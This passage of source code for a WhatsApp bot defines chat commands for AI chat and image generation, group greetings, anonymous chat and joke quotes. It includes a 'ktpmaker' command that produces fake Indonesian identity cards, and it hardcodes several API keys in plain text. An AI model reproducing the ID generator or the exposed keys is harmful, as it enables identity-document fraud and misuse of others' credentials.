}, { quoted: m })
await Dare.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);   
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Dare.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 🙂 *CHANNEL LINK:* https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Dare.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
case 'realistic': case '3dmodel': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    	if (!text) return reply(`*Example:* ${prefix + command} blue sky`)
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, bad face drawing, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    await Dare.sendMessage(m.chat, { image: { url: gpt.result }, caption: ``}, {quoted: m})
Dare.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
  } catch(e) {
    return reply("`GPT Not Responding`")
  }
}
break
case 'diffusion': {
    if (!text) return reply('What do you want to create?');

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    let myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");

    let raw = JSON.stringify({
        "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
        "prompt": text,
        "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
        "width": "720",
        "height": "720",
        "samples": "1",
        "num_inference_steps": "20",
        "seed": null,
        "guidance_scale": 7.5,
        "safety_checker": "yes",
        "multi_lingual": "no",
        "panorama": "no",
        "self_attention": "no",
        "upscale": "no",
        "embeddings_model": null,
        "webhook": null,
        "track_id": null
    });

    let requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };

    try {
        let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
        let result = await response.json();

        if (result.output && result.output[0]) {
            let messageContent = `✨ *Diffusion AI Generated Image* ✨\n\n📌 *Prompt Used:* ${text}\n📥 *Image:*`;
            await Dare.sendMessage(m.chat, { image: { url: result.output[0] }, caption: messageContent }, { quoted: m });
        } else {
            reply('Failed to generate an image. Please try again with a different prompt.');
        }
    } catch (error) {
        console.error('Error:', error);
        reply('Something went wrong while generating the image. Please try again later.');
    }
}
break;
case 'indo-ai': {
    if (!text) return reply(`*• Example:* ${prefix + command} halo`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let gpt = await (await fetch(`https://itzpire.com/ai/gpt-web?q=${text}`)).json();

        if (gpt.result) {
            let messageContent = `✨ *Indo AI Response* ✨\n\n📌 *Query:* ${text}\n💬 *Response:* ${gpt.result}`;
            await Dare.sendMessage(m.chat, { image: { url: './data/image/thumb.jpg' }, caption: messageContent }, { quoted: m });
        } else {
            reply('Failed to fetch the AI response. Please try again with a different query.');
        }
    } catch (e) {
        console.error('Error:', e);
        reply('`*Error occurred while processing your request. Please try again later.*`');
    }
}
break;
case 'lepton': case 'leptonai': {
    if (!text) return replydare(`*• Example:* ${prefix + command} Who was the person who invented the computer in the Majapahit era?`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let gpt = await (await fetch(`https://api.giftedtech.my.id/api/ai/gpt-turbo?apikey=gifted&q=${text}`)).json();

        if (gpt.result) {
            let messageContent = `✨ *Lepton AI Response* ✨\n\n📌 *Query:* ${text}\n💬 *Response:* ${gpt.result}`;
            await Dare.sendMessage(m.chat, { image: { url: './data/image/lepton.jpg' }, caption: messageContent }, { quoted: m });
        } else {
            replydare('Failed to fetch the AI response. Please try again with a different query.');
        }
    } catch (e) {
        console.error('Error:', e);
        replydare('`*Error occurred while processing your request. Please try again later.*`');
    }
}
break;
//=========================================\\======
case 'cai': {
    if (!text) return replydare(`*Example:* ${command} who is Elon Musk`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        const ainya = await fetchJson(`https://api.giftedtech.my.id/api/ai/gpt-turbo?apikey=gifted&q=${encodeURIComponent(text)}`);
        const msgai = ainya.result;

        if (msgai) {
            let messageContent = `✨ *Karakter AI Response* ✨\n\n📌 *Query:* ${text}\n💬 *Response:* ${msgai}`;
            await Dare.sendMessage(m.chat, { image: { url: './data/image/cai.jpg' }, caption: messageContent }, { quoted: m });
        } else {
            replydare('Failed to fetch the AI response. Please try again with a different query.');
        }
    } catch (e) {
        console.error('Error:', e);
        replydare('`*Error occurred while processing your request. Please try again later.*`');
    }
}
break;
//=========================================\\======
case 'nano': {
  if (!text) return reply(`_hi.._`)
try {
const ainya = await fetchJson(`https://api.giftedtech.my.id/api/ai/gpt-turbo?apikey=gifted&q=${encodeURIComponent(text)}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
break 
//=========================================\\======
case '---':{
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins && !DareTheCreator) return reply('For Admin only!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
//=========================================\\======
case 'autoaigrup':case 'aigrup': case 'autoaigc':{
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins && !DareTheCreator) return reply('Admin only feature!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return reply(`It's active`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return reply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Disabling Auto AI')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autosimi':{
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins && !DareTheCreator) return reply('Admin only feature!')
if (args[0] === "on") {
addCountCmd('#autosimi', m.sender, _cmd)
if (isAutosimi) return reply(`It's active`)
siminya.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autosimi', m.sender, _cmd)
if (!isAutosimi) return reply(`Udah nonaktif`)
let anu = siminya.indexOf(m.chat)
siminya.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Disabling Auto Simi')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'nanochat': {
    if (!m.isGroup) return reply('This feature is for groups only!');
    if (!isAdmins && !DareTheCreator) return reply('This feature is for admins only!');

    if (args[0] === "on") {
        addCountCmd('#nanochat', m.sender, _cmd);
        if (isnanochat) return reply('Nanochat is already active.');
        chatnano.push(m.chat);
        fs.writeFileSync('./database/chatnano.json', JSON.stringify(chatnano, null, 2));
        reply('_Nanochat has been successfully activated._');
    } else if (args[0] === "off") {
        addCountCmd('#nanochat', m.sender, _cmd);
        if (!isnanochat) return reply('Nanochat is already deactivated.');
        let index = chatnano.indexOf(m.chat);
        chatnano.splice(index, 1);
        fs.writeFileSync('./database/chatnano.json', JSON.stringify(chatnano, null, 2));
        reply('_Nanochat has been successfully deactivated._');
    } else {
        let messageContent = `Hi ${pushname},\n\nTo use the *${command}* feature, you can:\n\n- Send *${command} on* to activate Nanochat.\n- Send *${command} off* to deactivate Nanochat.`;
        await Dare.sendMessage(m.chat, { image: { url: './data/image/thumb.jpg' }, caption: messageContent }, { quoted: m });
    }
}
break;
//=========================================\\=====
case 'cekkhodam':
  if (!text) return replydare('Which name do you want to check the khodam for?');
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }
  const ceknyaa = pickRandom(['Leopard, Sumatran Elephant, Orangutan, White Tiger, Javanese Rhino, Pocong, Witch, Crow, Wewe Gombel, Kuyang, Lembuswana, Anoa ', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', ' Lizard', 'Peacock', 'Lumping Horse', 'Estuarine Crocodile', 'Javanese Bull', 'Long-tailed Monkey', 'Tarsius', 'Blue Sparrow', 'Red Devil', 'Green Collar', 'Palasik ', 'Nyi Roro Kidul', 'Snake Detective', 'Crow', 'Honey Bear', 'Wolf', 'Coral Shark', 'Eagle', 'Crocodile', 'Sumba Horse', 'Crocodile Fish', 'Bali Starling', 'Etawa Goat', 'Bat', 'Owl', 'Beetlefish']);
  const damping = pickRandom(['1 year ago', '2 years ago', '3 years ago', '4 years ago', 'born']);
  const khodam = `khodam ${text}, is ${ceknyaa}, accompanying from ${damping}`;

  Dare.sendMessage(m.chat, {audio: {url: `https://nue-api.vercel.app/api/tts?lang=id&text=${khodam}`}, mimetype: 'audio/mpeg', ptt: true }, {quoted: m});

  break;
//=========================================\\======
case 'welcome':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!!!')
if (!isAdmins && !DareTheCreator) return reply('Admin only feature!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return reply(`It's on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Successfully activated welcome to this group')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return reply(`It's off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Successfully deactivated welcome in this group')
} else {
reply(`${prefix+command} on -- _activate_\n${prefix+command} off -- _Disable_`)
}
break
case 'left': case 'goodbye':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins && !DareTheCreator) return reply('Admin only feature!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return reply(`It's on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
reply('Successfully activated goodbye in this group')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return reply(`It's off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
reply('Successfully deactivated goodbye in this group')
} else {
reply(`${prefix+command} on -- _activate_\n${prefix+command} off -- _ Disable _`)
}
break
case 'onlygroup':
            case 'onlygc':
                if (!DareTheCreator) return reply('Special Owner Features!')
                if (args.length < 1) return replydare(`Example: ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replydare(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                  db.settings[botNumber].onlygrub = false
                    replydare(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!DareTheCreator) return reply('Special Owner Features!')
                if (args.length < 1) return replydare(`Example: ${prefix + command} on/off`)
                if (q == 'on') {
                    db.settings[botNumber].onlypc = true
                    replydare(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlypc = false
                    replydare(`Successfully Changed Only-Pc To ${q}`)
                }
            break
case 'setwelcome':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!DareTheCreator && !isAdmins) return reply('Special Owner Features!')
if (!text) return reply(`Use it with ${prefix+command} *text_welcome*\n\n_Example_\n\n${prefix+command} Hello @user, Welcome to @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
reply(`Successfully set welcome!`)
break
case 'changewelcome':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!DareTheCreator && !isAdmins) return reply('Special Owner Features!')
if (!text) return reply(`Use it with ${prefix+command} *text_welcome*\n\n_Example_\n\n${prefix+command} Hello @user, Welcome to @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
reply(`Successful change set welcome text!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
reply(`Successful change set welcome text!`)
}
break
case 'delsetwelcome':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!DareTheCreator && !isAdmins) return reply('Special Owner Features!')
if (!isSetWelcome(m.chat, set_welcome_db)) return reply(`There is no welcome set here yet..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
reply(`Successfully deleted set welcome`)
break
case 'setleft':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!DareTheCreator && !isAdmins) return reply('Special Owner Features!')
if (!text) return reply(`Use it by ${prefix + command} *text_left*\n\n_Example_\n\n${prefix + command} Hello @user, Goodbye from @group`)
if (isSetLeft(m.chat, set_left_db)) return reply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Successfully set left!`)
break
case 'changeleft':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!DareTheCreator && !isAdmins) return reply('Special Owner Features!')
if (!text) return reply(`Use it by ${prefix + command} *text_left*\n\n_Example_\n\n${prefix + command} Hello @user, Goodbye from @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
reply(`Successfully change set left text!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Successfully change set left text!`)
}
break
case 'delsetleft':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!DareTheCreator && !isAdmins) return reply('Special Owner Features!')
if (!isSetLeft(m.chat, set_left_db)) return reply(`There is no set left here yet..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
reply(`Successfully delete set left`)
break
//=========================================\\======

//=========================================\\======
case 'ktpmaker': {
if (args.length == 0) return reply(`*Usage:*\n${prefix+command} Nik|Province|Regency|Name|PlaceDate of Birth|Kel|Address|RtRw|KelDesa|District|Religion|Status|Occupation|Region|Valid|blood type\n\n${prefix +command} 35567778995|West Java Province|Bekasi Regency|jebeh Store|Bekasi |Male|Bintara Jaya|02/05|Karang Indah|West Bekasi|Islam|Singles|anakjebeh|Indonesia|2021-2080|abc \n\ n*[warning]*\nevery query input after the center line | the use of spaces is prohibited\n*「INFO IMAGE 」*\nFor KTP Profile Picture\nUpload from the following website\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nEXAMPLE RESULTS HIS\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
reply(mess.wait)
let get_args = args.join(" ").split("|")
let nik = get_args[0]
if (!nik) return m.reply('sɪʀ, make sure your familys registration number doesnt look like the original NIK')
let prov = get_args[1]
if (!prov) return m.reply('what province?')
let kabu = get_args[2]
if (!kabu) return m.reply('what district?')
let name = get_args[3]
if (!name) return m.reply('whats your name?')
let ttl = get_args[4]
if (!ttl) return m.reply('where is your date of birth?')
let jk = get_args[5]
if (!jk) return m.reply('gender male or female sɪʀ')
let jl = get_args[6]
if (!jl) return m.reply('Whats your home address?')
let rtrw = get_args[7]
if (!rtrw) return m.reply('How much is your RT/RW?')
let lurah = get_args[8]
if (!lurah) return m.reply('what village?')
let camat = get_args[9]
if (!camat) return m.reply('which district?')
let agama = get_args[10]
if (!agama) return m.reply('what religion are you?')
let nikah = get_args[11]
if (!nikah) return m.reply('status does not yet exist')
let kerja = get_args[12]
if (!kerja) return m.reply('there are no jobs yet')
let warga = get_args[13]
if (!warga) return m.reply('regions dont exist yet')
let until = get_args[14]
if (!until) return m.reply('there is no validity period yet')
 Dare.sendMessage(m.chat, { image: {url: `https://api.lolhuman.xyz/api/ktpmaker?apikey=efcb180d3fd3134748648887&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=https://telegra.ph/file/2487220c98c7c4fb6f438.jpg`}, caption: 'nih ktp nya cok' }, { quoted: m })
}
break 
//=========================================\\======
case 'report': {
replydare(` =====[ *DEVELOPER OF 𝘽.𝙈.𝘽* ]===== 
• ᴅᴏɴ'ᴛ ᴄʜᴀᴛ ᴄᴀʀᴇʟᴇꜱꜱʟʏ ᴛᴏ ᴛʜᴇ ᴏᴡɴᴇʀꜱ ɴᴜᴍʙᴇʀ, ɪᴛ ᴡɪʟʟ ʙᴇ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ʙʟᴏᴄᴋᴇᴅ
• ᴅᴏɴ'ᴛ ᴄᴀʟʟ/ᴛᴇʟᴇᴘʜᴏɴᴇ ᴛʜᴇ ᴏᴡɴᴇʀ ᴡɪᴛʜᴏᴜᴛ ᴘᴇʀᴍɪꜱꜱɪᴏɴ • ᴄʜᴀᴛ ꜱᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛʜᴇ ᴘᴏɪɴᴛ, ᴛʏᴘᴇ .ᴏᴡɴᴇʀ or .reportbug , 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕",`)
}
break
//=========================================\\======
case 'sendprofile': case 'sendprofil':
if (m.isGroup) return reply('Feature Cannot Be Used for Groups!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ You've never started a chat!\n\n${prefix}start -- _Looking for a partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await Dare.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await Dare.sendContact(partnerJID, [m.sender.split("@")[0]])
Dare.sendMessage(m.chat, { text: '🙂 Successfully sent the profile to your chat friend!' }, { quoted: m })
Dare.sendMessage(partnerJID, { text: '👨👩 Your chat friend provides their profile contact!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
if (m.isGroup) return reply('This feature cannot be used for groups!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _looking for partners_`)
 }
break
//=========================================\\======
case 'mulai': case 'start': {
if (m.isGroup) return reply('Feature Cannot Be Used for Groups!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`You Are Still in an Anonymous Session\n\n${prefix}exit -- _exit chat session_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
Dare.sendMessage(room.a, {text: `Successfully Finding a Partner, now you can send a message\n\n${prefix}skip -- _looking for another partner_\n${prefix}stop -- _stopping the chat session_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Successfully Finding a Partner, now you can send a message\n\n${prefix}skip -- _looking for another partner_\n${prefix}stop -- _stop the chat session_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Please Wait. Looking for Partners`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Feature Cannot Be Used for Groups!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`You Are Not In An Anonymous Session\n\n${prefix}start -- _looking for a partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await Dare.sendText(other, `Partner Has Left Anonymous Session`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
Dare.sendMessage(room.a, {text: `Successfully Finding a Partner, now you can send a message\n\n${prefix}skip -- _looking for another partner_\n${prefix}stop -- _stopping the chat session_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Successfully Finding a Partner, now you can send a message\n\n${prefix}skip -- _looking for another partner_\n${prefix}stop -- _stopping the chat session_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Please Wait. Looking for Partners`)
}
break
}
//=========================================\\======
case 'quotesanime':
case 'quotesanim': {
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
//=========================================\\======
case 'dquotes': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Do you like coffee? I really like it. Do you know the reason why? Coffee is like you, its bitter but it makes you addicted so you want to keep going.',
'Salary is like the former, right? Usually it only lasts for a moment.',
'Mr Haji said, guys who dont want to go to Friday prayers are told to just wear skirts.',
'Do you know your ex? An ex is like a salary person, usually just passing through our lives.',
'I like you, you like him, but unfortunately he doesnt like you. Wow, funny huh? Love is this complicated.',
'Google is great, right? But unfortunately, no matter how great Google is, it cant find our soul mate.',
'Too often holding an eyebrow pencil can make your eyes blind, if you poke it into your eyes.',
'I work hard because I realize that money doesnt have legs to find its way into my pocket.',
'If you are unable to convince and amaze people with your intelligence, confuse them with your stupidity.',
'When youre tired from working, youre even more tired when youre unemployed.',
'We live in a time when you are angry when you are wrong, but when you are right you are called wrong.',
'No boyfriends shoulder? Dont worry, theres still a shoulder to lean on.',
'Loving yourself is natural, what is not natural is loving your father.',
'He said he couldnt lie. Yes, only the eyes can see.',
'Honey in your right hand, poison in your left hand, your soul mate remains in Gods hands.',
'Cheating doesnt happen because there is intention, cheating happens because your girlfriend is still selling.',
'Netizens who do thumb exercises on their cell phones dont use cooling, no wonder their comments keep getting hot.',
'Your soul mate doesnt go anywhere, but your rivals are everywhere.',
'I always feel wrong in your eyes. If thats the case, tomorrow Ill move it to your nose.',
'Theres no need to be ashamed of being single, being single doesnt mean youre not selling, but that no one wants to.',
'If your prayer has not been answered then be patient, remember that it is not just you who is praying!',
'Still hoping and continuing to hope that over time I will become the champion of hope.',
'Humans can plan, but in the end balance is what determines',
'His status is spiritual, his behavior is spiritual.',
'Failure is not success',
'I was going to eat meatballs, but it was really hot, it looked like the meatballs were having a fever.',
'I was once rich too, when I got paid.',
'I was dumped by my girlfriend because we had different beliefs. Im sure that Im handsome, but hes not.',
'Your future depends on your dreams, so sleep more.',
'No matter how heavy your work is, it will be lighter if you dont carry it.',
'Do not expect too much! Ill get sick later!',
'Remember! Youre single',
'I dont know what to type',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesdare': {
const bucin = [
    "I chose to be alone, not because I was waiting for the perfect one, but because I needed someone who never gave up.",
    "A single person is created with a partner he has not yet found.",
    "Single. Maybe that's God's way of saying 'Take a break from wrong love'.",
    "Singles are young people who prioritize their personal development for a more classy love in the future.",
    "I'm not looking for someone who is perfect, but I'm looking for someone who is perfect thanks to my strengths.",
    "People's boyfriends are our pending soul mates.",
   "Singleness will pass. Everything comes to a time, when all solitude becomes togetherness with a halal lover. Be patient.",
    "Romeo was willing to die for Juliet, Jack died to save Rose. The point is, if you still want to live, be single.",
    "I look for people not for their strengths, but I look for people for their sincerity.",
    "A soul mate is not flip-flops, which are often confused. So keep on fighting properly.",
    "If you are a guitar string, I don't want to be the guitarist. Because I don't want to break up with you.",
    "If loving you is an illusion, then let me imagine forever.",
    "Honey... My job is only to love you, not fight fate.",
    "When I'm with you it feels like 1 hour is only 1 second, but if I'm far from you it feels like 1 day becomes 1 year.",
    "Sumedang tofu banana compote, even though the distance stretches, my love will never disappear.",
    "I want to be the only one, not one of them.",
    "I can't promise to be good. But I promise to always be by your side.",
    "If I become a representative of the people I will definitely fail, how can I think about the people if the only thing on my mind is you?",
    "Look at my garden, full of flowers. Look at your eyes, my heart is full of flowers.",
    "Promise to stay with me now, tomorrow and forever.",
    "Longing does not only arise because of distance apart. But also because of desires that do not come true.",
    "You will never be far from me, wherever I go you are always there, because you are always in my heart, what is far is only our bodies, not our hearts.",
    "I know that in every glance I make, we are hindered by distance and time. But I am sure that in the future we will definitely be able to be together.",
    "Missing you without ever meeting you is like writing a song that has never been sung.",
    "There are times when distance is always a barrier between me and you, but still in my heart we are always close.",
    "If this heart can't contain all the longing, there's nothing I can do except pray for you.",
    "Maybe at this moment I can only hold back this longing. Until the time comes when I can meet and release this longing with you.",
    "Through the longing that surges in my heart, sometimes I really need your loving embrace.",
    "In the cold night, I can no longer remember; How often I think about you and miss you.",
    "Missing you is like rain that comes suddenly and lasts a long time. And even after the rain stops, I still miss you.",
    "Since I got to know you, I want to keep learning, learning to be the best for you.",
    "Do you know the difference between a pencil and your face? With a pencil the writing can be erased, but with your face nothing can be erased from my mind.",
    "It's not the National Exam tomorrow that I have to worry about, but the life exam that I went through after you left me.",
    "One thing that makes me happy at school is being able to see your smile every day.",
    "Do you know the difference between going to school and going to your house? If you go to school, you will definitely bring books and pens, but if you go to your house, I just bring my heart and love.",
    "I'm not sad if tomorrow is Monday, I'll be sad if I don't see you.",
    "The moment of my love is perpendicular to the moment of your love. Making our love a perfect equilibrium point.",
    "I'm willing to take part in a race around the world, as long as you are the finish line.",
    "My homework is to miss you. Stronger than Mathematics, broader than Physics, stronger than Biology.",
    "My love for you is like metabolism, which will not stop until death.",
    "If you're as tall as you, come and pick me up, I'll take you home.",
    "Eat whatever I like as long as it's with you, including eating liver.",
    "Love is like a death sentence. If you don't shoot, you'll hang.",
    "Loving you is like a drug: once you try it, it becomes addictive, don't try it, it makes you curious, you leave it and it makes you addicted.",
    "I like snacking the most because snacking is delicious. Moreover, I have you completely...",
    "This world only belongs to the two of us. The others are just renting.",
    "For me, all days are Tuesdays. Tuesdays in Heaven if you are close...",
